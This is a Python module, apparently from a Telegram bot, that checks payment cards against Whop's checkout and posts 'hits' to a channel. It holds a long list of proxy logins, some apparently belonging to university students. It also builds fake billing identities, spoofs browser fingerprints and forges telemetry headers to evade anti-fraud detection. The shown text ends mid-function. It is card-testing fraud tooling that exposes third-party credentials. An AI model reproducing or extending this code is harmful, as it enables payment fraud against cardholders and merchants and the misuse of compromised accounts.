import re
import json
import uuid
import random
import time
import base64
import logging
import asyncio
import html
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Optional, Any, Tuple

from aiogram import Router, F, types, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest

from curl_cffi import requests as curl_requests
import urllib3

from database import get_user_credits, update_credits, create_user

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


router = Router()
logger = logging.getLogger(__name__)

WHOP_SESSIONS: Dict[int, Dict[str, Any]] = {}
MAX_CARDS = 10
RESULTS_PER_PAGE = 10
UPDATE_EVERY = 1
PARALLEL_LIMIT = 1
HIT_CHANNEL_ID = -1003744006874
BOT = "https://t.me/Try_Low"


EMOJI_CHARGED = "5427168083074628963"
EMOJI_INSUFFICIENT = "6100515480735321747"
EMOJI_DECLINED = "5273914604752216432"
EMOJI_STOP = "6100541628496219252"


PROXIES = [
    # ── Raw IPs ──
    "103.156.91.173:58798:zqrn9y5d:zQRN9y5d",
    "103.161.113.230:18491:dz46cabj:ksuRcKlNqJMU",
    "103.183.121.128:58122:3dfw7c6x:oSeqx0CNeV0k",
    "103.183.121.211:11657:azqdr5vn:71WCPuMwyc72",
    "103.183.121.59:34219:y7g4dd8d:Buw96jtGFKA5",
    "103.204.108.142:12345:naveed:Qwerty_123ABC",
    "103.204.109.189:12345:tickets:proxyon145",
    "104.160.17.116:12345:tickets:proxyon145",
    "107.150.71.197:12345:tickets:proxyon145",
    "107.150.71.30:12345:tickets:proxyon145",
    "107.172.241.122:12345:tickets:proxyon145",
    "107.173.112.194:12345:tickets:proxyon145",
    "135.148.117.75:59813:oldg6k2r:oLdG6k2R",
    "138.94.218.193:12345:tickets:proxyon145",
    "153.121.71.115:822:socialwire:87xb2kziRk4xa",
    "161.0.1.119:12345:tickets:proxyon145",
    "161.0.1.13:12345:tickets:proxyon145",
    "162.212.170.252:12345:tickets:proxyon145",
    "162.212.170.77:12345:tickets:proxyon145",
    "168.228.46.128:12345:tickets:proxyon145",
    "168.228.46.189:12345:tickets:proxyon145",
    "175.29.133.8:5433:799JRELTBPAE:F7BQ7D3EQSQA",
    "175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "181.177.102.240:12345:tickets:proxyon145",
    "181.215.16.247:12345:tickets:proxyon145",
    "185.122.170.10:12345:tickets:proxyon145",
    "185.122.170.73:12345:tickets:proxyon145",
    "190.123.219.12:12345:tickets:proxyon145",
    "190.123.219.34:12345:tickets:proxyon145",
    "191.102.165.164:12345:tickets:proxyon145",
    "192.227.238.145:12345:tickets:proxyon145",
    "193.254.17.97:64708:1DnugnypC:4yPtzMd3f",
    "194.33.9.114:64170:nWtrJqsb:RYYEE72Y",
    "194.33.9.136:49520:nWtrJqsb:RYYEE72Y",
    "196.196.23.136:12345:tickets:proxyon145",
    "196.196.23.45:12345:tickets:proxyon145",
    "196.244.48.124:12345:naveed:Qwerty_123ABC",
    "196.244.48.126:12345:naveed:Qwerty_123ABC",
    "196.244.48.26:12345:naveed:Qwerty_123ABC",
    "196.247.205.113:12345:tickets:proxyon145",
    "196.247.205.228:12345:tickets:proxyon145",
    "196.247.205.48:12345:tickets:proxyon145",
    "196.247.205.88:12345:tickets:proxyon145",
    "196.247.205.91:12345:tickets:proxyon145",

    # ── 202.28.17.8 — Thai university pool ──
    "202.28.17.8:8080:s5802016810053:1549900215617",
    "202.28.17.8:8080:s6003026810028:1720800122226",
    "202.28.17.8:8080:s6202052810029:78496978",
    "202.28.17.8:8080:s6301074610292:za0643250344",
    "202.28.17.8:8080:s6402011520288:surikan123",
    "202.28.17.8:8080:s6402013510115:s1609900520681",
    "202.28.17.8:8080:songponp:neung1nakub",

    # ── More raw IPs ──
    "23.104.162.39:12345:tickets:proxyon145",
    "37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "45.145.162.63:58536:nWtrJqsb:RYYEE72Y",
    "5.157.5.100:12345:tickets:proxyon145",
    "5.157.5.154:12345:tickets:proxyon145",
    "5.249.177.8:5433:9T1GYK9U3S2B:SAWF8Y0JHSB0",
    "50.3.137.165:12345:tickets:proxyon145",
    "50.3.137.177:12345:tickets:proxyon145",
    "51.195.198.170:36647:fwos7n0b:fWOS7n0B",
    "82.117.94.14:63126:RrkJjUqfT:jYEH6Emdg",

    # ── pvdata.host pool (shared creds) ──
    "ae-dub.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "at-wie.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-bri.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-mel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-per.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "be-bru.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "bg-sof.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "br-sao.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-van.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ch-zur.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cy-lim.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cz-pra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-ber.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-fra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "fr-par.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "gr-ath.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "im-bal.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "in-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "is-rey.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "it-mil.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "jp-tok.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "kr-seo.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lt-sia.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lu-lux.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "mx-mex.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "my-kua.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "no-osl.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pt-lis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "rs-bel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-got.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-kis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-sto.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "sg-sin.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "th-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "tw-tai.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ua-nik.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk-lon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk-man.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "vn-hoc.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "za-joh.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",

    # ── g-w.info free proxies ──
    "ca-free-proxy.g-w.info:59785:diehard33:3liubjnixc8456789i",
    "de-free-proxy.g-w.info:59784:smoothysuck:ublIUnbiybkvDfgg",
    "in-free-proxy.g-w.info:59783:dagandnorb:EdsAbQuamAn999",
    "uk-free-proxy.g-w.info:59782:meetthejack:8ohlsid7hlPenEdsAbQ",
    "us-free-proxy.g-w.info:59781:user3proxyserver:huccuAn_oc7o87hubhjYY",

    # ── University proxies ──
    "authproxy.fju.edu.tw:3128:506061324:enya07141013",
    "proxy.sru.ac.th:8080:6115103001019:1819900293950",
    "proxy.sru.ac.th:8080:64052511005:3820800334521",
    "proxy.sru.ac.th:8080:jantawan.ban:jantawan.ban",
    "proxy.sru.ac.th:8080:patarawan.kah:patarawan.kah",
    "proxy.sru.ac.th:8080:prairat.kon:24122529**",
    "proxy.ttu.edu.tw:3128:g10701005:j0i2m2",

    # ── cactussstp.com — au1 ──
    "au1.cactussstp.com:81:bvmbsmie:shibby2511",
    "au1.cactussstp.com:81:hughmuir2:lisamarie11",
    "au1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "au1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "au1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "au1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "au1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ca1 ──
    "ca1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ch1 ──
    "ch1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:81:yefprelf:dr2gsmab",
    "ch1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "ch1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── es1 ──
    "es1.cactussstp.com:81:bvmbsmie:shibby2511",
    "es1.cactussstp.com:81:hughmuir2:lisamarie11",
    "es1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:81:yefprelf:dr2gsmab",
    "es1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "es1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "es1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "es1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "es1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "es1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── in1 ──
    "in1.cactussstp.com:81:bvmbsmie:shibby2511",
    "in1.cactussstp.com:81:hughmuir2:lisamarie11",
    "in1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:81:yefprelf:dr2gsmab",
    "in1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "in1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "in1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "in1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "in1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "in1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── it1 ──
    "it1.cactussstp.com:81:bvmbsmie:shibby2511",
    "it1.cactussstp.com:81:hughmuir2:lisamarie11",
    "it1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "it1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "it1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "it1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── lv1 ──
    "lv1.cactussstp.com:81:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:81:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "lv1.cactussstp.com:81:yefprelf:dr2gsmab",
    "lv1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "lv1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "lv1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── my1 ──
    "my1.cactussstp.com:81:bvmbsmie:shibby2511",
    "my1.cactussstp.com:81:hughmuir2:lisamarie11",
    "my1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "my1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "my1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "my1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "my1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── pt1 ──
    "pt1.cactussstp.com:81:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:81:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:81:yefprelf:dr2gsmab",
    "pt1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "pt1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── ro1 ──
    "ro1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ru1 ──
    "ru1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── uk2 ──
    "uk2.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:3129:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── uk3 ──
    "uk3.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:3129:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us1 ──
    "us1.cactussstp.com:81:bvmbsmie:shibby2511",
    "us1.cactussstp.com:81:hughmuir2:lisamarie11",
    "us1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us2 ──
    "us2.cactussstp.com:81:bvmbsmie:shibby2511",
    "us2.cactussstp.com:81:hughmuir2:lisamarie11",
    "us2.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us3 ──
    "us3.cactussstp.com:81:bvmbsmie:shibby2511",
    "us3.cactussstp.com:81:hughmuir2:lisamarie11",
    "us3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us3.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us4 ──
    "us4.cactussstp.com:81:bvmbsmie:shibby2511",
    "us4.cactussstp.com:81:hughmuir2:lisamarie11",
    "us4.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us4.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us4.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us4.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us4.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us6 ──
    "us6.cactussstp.com:81:bvmbsmie:shibby2511",
    "us6.cactussstp.com:81:hughmuir2:lisamarie11",
    "us6.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us6.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us6.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us6.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us6.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us6.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us6.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us9 ──
    "us9.cactussstp.com:81:bvmbsmie:shibby2511",
    "us9.cactussstp.com:81:hughmuir2:lisamarie11",
    "us9.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us9.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us9.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us9.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
]


FIRST_NAMES = ["James", "Michael", "Robert", "David", "William", "John", "Alex", "Sam", "Chris", "Ryan"]
LAST_NAMES = ["Wilson", "Smith", "Johnson", "Brown", "Williams", "Jones", "Davis", "Miller", "Garcia", "Martinez"]

STATE_ZIPS = {
    "AL":"35004","AK":"99501","AZ":"85001","AR":"72201","CA":"90001",
    "CO":"80201","CT":"06101","DE":"19801","FL":"33101","GA":"30301",
    "HI":"96801","ID":"83201","IL":"60601","IN":"46201","IA":"50301",
    "KS":"66002","KY":"40201","LA":"70112","ME":"04032","MD":"21201",
    "MA":"02101","MI":"48201","MN":"55101","MS":"39201","MO":"63101",
    "MT":"59001","NE":"68102","NV":"89101","NH":"03031","NJ":"07001",
    "NM":"87501","NY":"10001","NC":"27501","ND":"58102","OH":"44101",
    "OK":"73099","OR":"97001","PA":"19019","RI":"02840","SC":"29201",
    "SD":"57101","TN":"37201","TX":"77001","UT":"84044","VT":"05601",
    "VA":"23218","WA":"98001","WV":"24701","WI":"53001","WY":"82001",
}

STATE_CITY = {
    "CA":"Los Angeles","TX":"Houston","FL":"Miami","NY":"New York",
    "WA":"Seattle","CO":"Denver","MI":"Detroit","GA":"Atlanta","AZ":"Phoenix",
    "OH":"Cleveland","IL":"Chicago","PA":"Philadelphia","NC":"Charlotte",
    "VA":"Richmond","MA":"Boston","NJ":"Newark","MD":"Baltimore",
    "MO":"St. Louis","OR":"Portland",
}

STREETS = ["Evergreen Terrace","Main Street","Oak Avenue","Sunset Boulevard","Maple Drive"]

SCREEN_RESOLUTIONS = [
    (1920, 1080), (1366, 768), (1536, 864), (1440, 900), (1280, 720),
    (2560, 1440), (1680, 1050), (1600, 900), (800, 1280), (390, 844),
    (412, 915), (360, 740), (375, 667), (414, 896)
]

PLATFORMS = ["Win32", "MacIntel"]
LANGUAGES = ["en-US", "en-GB", "en-IN", "en-CA", "en-AU"]
TIMEZONES = ["America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles",
             "Europe/London", "Europe/Paris", "Asia/Tokyo", "Asia/Calcutta", "Australia/Sydney"]

TZ_OFFSETS = {
    "America/New_York": -240, "America/Chicago": -300, "America/Denver": -360,
    "America/Los_Angeles": -420, "Europe/London": 60, "Europe/Paris": 120,
    "Asia/Tokyo": 540, "Asia/Calcutta": 330, "Australia/Sydney": 600
}

WEBGL_VENDORS = [
    ("Google Inc. (NVIDIA)", "ANGLE (NVIDIA, NVIDIA GeForce RTX 4060 Laptop GPU Direct3D11 vs_5_0 ps_5_0, D3D11)"),
    ("Google Inc. (NVIDIA)", "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
    ("Intel Inc.", "ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
    ("Apple Inc.", "Apple M1"),
    ("Google Inc. (AMD)", "ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0, D3D11)")
]

PLUGINS_SETS = [
    ["PDF Viewer","Chrome PDF Viewer","Chromium PDF Viewer","Microsoft Edge PDF Viewer","WebKit built-in PDF"],
    ["PDF Viewer","Chrome PDF Viewer","Chromium PDF Viewer","WebKit built-in PDF"],
    ["PDF Viewer","Chrome PDF Viewer","WebKit built-in PDF"]
]

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
SEC_CH_UA = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'


def luhn_check(number: str) -> bool:
    """Validate card number using Luhn algorithm."""
    digits = [int(d) for d in str(number)][::-1]
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def random_email() -> str:
    return f"{random.choice(FIRST_NAMES).lower()}.{random.choice(LAST_NAMES).lower()}{random.randint(1,9999)}@gmail.com"

def random_address() -> Dict[str, str]:
    state = random.choice(list(STATE_ZIPS.keys()))
    return {
        "line1": f"{random.randint(100,9999)} {random.choice(STREETS)}",
        "city": STATE_CITY.get(state, "Springfield"),
        "state": state,
        "postal": STATE_ZIPS[state],
        "country": "US"
    }

def random_name() -> str:
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"

def generate_trace() -> str:
    return uuid.uuid4().hex

def generate_span() -> str:
    return uuid.uuid4().hex[:16]

def generate_baggage(trace_id: str, release: str) -> str:
    sample_rand = str(uuid.uuid4().int % 10000000000000000 / 10000000000000000)[:17]
    return (
        f"sentry-environment=production,sentry-release={release},"
        f"sentry-public_key=c6989961c9181cc2db941b290d874f29,"
        f"sentry-trace_id={trace_id},sentry-org_id=1320754,"
        f"sentry-sampled=false,sentry-sample_rand={sample_rand},"
        f"sentry-sample_rate=1"
    )

def random_fingerprint() -> Dict[str, Any]:
    screen_w, screen_h = random.choice(SCREEN_RESOLUTIONS)
    platform = random.choice(PLATFORMS)
    lang = random.choice(LANGUAGES)
    tz = random.choice(TIMEZONES)
    hw = random.choice([2, 4, 8, 12, 16])
    mem = random.choice([4, 8, 16])
    vendor, renderer = random.choice(WEBGL_VENDORS)
    plugins = random.choice(PLUGINS_SETS)
    tz_offset = TZ_OFFSETS.get(tz, 0)
    dpr = random.choice([1.0, 1.25, 1.5, 2.0])
    inner_w = int(screen_w * 0.6) + random.randint(-50, 50)
    inner_h = int(screen_h * 0.8) + random.randint(-50, 50)

    return {
        "screen_w": screen_w, "screen_h": screen_h,
        "platform": platform, "lang": lang, "tz": tz,
        "hw": hw, "mem": mem, "vendor": vendor, "renderer": renderer,
        "plugins": plugins, "tz_offset": tz_offset, "dpr": dpr,
        "inner_w": inner_w, "inner_h": inner_h
    }

def extract_dynamic(html: str) -> Tuple[Optional[str], Optional[str], Optional[str], str, Optional[str], Optional[str]]:
    """Extract dynamic data from Whop HTML page."""
    next_data = None
    m = re.search(r'<script id="__NEXT_DATA__" type="application/json">(.*?)</script>', html, re.S)
    if m:
        try:
            next_data = json.loads(m.group(1))
        except Exception:
            pass

    def rec(obj, pat):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, str):
                    mm = re.search(pat, v)
                    if mm:
                        return mm.group(0)
                elif isinstance(v, (dict, list)):
                    res = rec(v, pat)
                    if res:
                        return res
        elif isinstance(obj, list):
            for item in obj:
                res = rec(item, pat)
                if res:
                    return res
        return None

    def find_plan(obj):
        if isinstance(obj, dict):
            if obj.get("id", "").startswith("plan_") and (
                "formattedPeriodV2" in obj or "initialPrice" in obj or "rawInitialPrice" in obj
            ):
                return obj.get("id")
            for k, v in obj.items():
                res = find_plan(v)
                if res:
                    return res
        elif isinstance(obj, list):
            for item in obj:
                res = find_plan(item)
                if res:
                    return res
        return None

    plan_id = account_id = container = release = product_id = slug = None

    if next_data:
        plan_id = find_plan(next_data) or rec(next_data, r'plan_[a-zA-Z0-9]+')
        account_id = rec(next_data, r'biz_[a-zA-Z0-9]+')
        container = rec(next_data, r'/card-assembly/[a-zA-Z0-9]+/')
        release = rec(next_data, r'[a-f0-9]{40}')
        product_id = rec(next_data, r'prod_[a-zA-Z0-9]+')
        slug_match = re.search(r'"slug"\s*:\s*"([^"]+)"', html)
        if slug_match:
            slug = slug_match.group(1)

    if not plan_id:
        plan_match = re.search(r'plan_[a-zA-Z0-9]+', html)
        if plan_match:
            plan_id = plan_match.group(0)
    if not account_id:
        account_match = re.search(r'biz_[a-zA-Z0-9]+', html)
        if account_match:
            account_id = account_match.group(0)
    if not product_id:
        product_match = re.search(r'prod_[a-zA-Z0-9]+', html)
        if product_match:
            product_id = product_match.group(0)
    if not container:
        container_match = re.search(r'/card-assembly/[a-zA-Z0-9]+/', html)
        if container_match:
            container = container_match.group(0)
    if not release:
        release_match = re.search(r'"release":"([a-f0-9]{40})"', html) or re.search(r'"buildId":"([a-f0-9]{40})"', html)
        if release_match:
            release = release_match.group(1)

    return plan_id, account_id, container, release or "unknown", product_id, slug

def get_message_from_response(resp: Dict) -> Optional[str]:
    """Extract error message from API response."""
    if not isinstance(resp, dict):
        return None


    for key in ("last_confirmation_error", "last_confirm_error"):
        lce = resp.get(key)
        if isinstance(lce, dict):
            msg = lce.get("message")
            if msg:
                return msg

            decline = lce.get("decline_code")
            if decline:
                return f"Declined: {decline}"

    payment = resp.get("payment")
    if isinstance(payment, dict):
        for k in ("last_payment_error", "error"):
